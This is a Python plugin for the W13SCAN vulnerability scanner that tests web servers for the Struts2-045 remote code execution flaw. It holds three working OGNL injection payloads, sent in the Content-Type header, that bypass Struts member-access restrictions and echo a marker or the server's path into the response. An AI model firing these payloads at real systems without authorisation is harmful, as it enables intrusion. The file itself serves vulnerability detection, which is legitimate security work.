# coding   :utf-8
# file     : struts2_045.py
# author   : go0p
# time     : 2019/8/17 12:00 PM
# software :PyCharm

import copy
import os

import requests

from lib.core.common import generateResponse
from lib.core.data import conf
from lib.core.enums import WEB_PLATFORM, VulType, PLACE
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-045远程代码执行'

    def audit(self):
        if WEB_PLATFORM.JAVA in self.response.programing or conf.level >= 2:
            headers = self.requests.headers

            check = '<Struts2-vuln-Check>'
            payloads = [
                r"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('<'+'Struts2-vuln-'+'Check>')).(#o.close())}",
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('Struts2-vuln-'+'Check>')).(#o.println(#path)).(#o.close())}",
                r'''%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("Struts2-vuln-"+"Check>"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
            ]

            for payload in payloads:
                headers['Content-Type'] = payload
                r = requests.get(self.requests.url, headers=headers,timeout=30)
                html1 = r.text
                if check in html1:
                    result = self.new_result()
                    result.init_info(self.requests.url, "Struts2-045远程代码执行", VulType.CODE_INJECTION)
                    result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                      "发现回显flag:{}".format(check), "", "", PLACE.POST)
                    self.success(result)
                    break
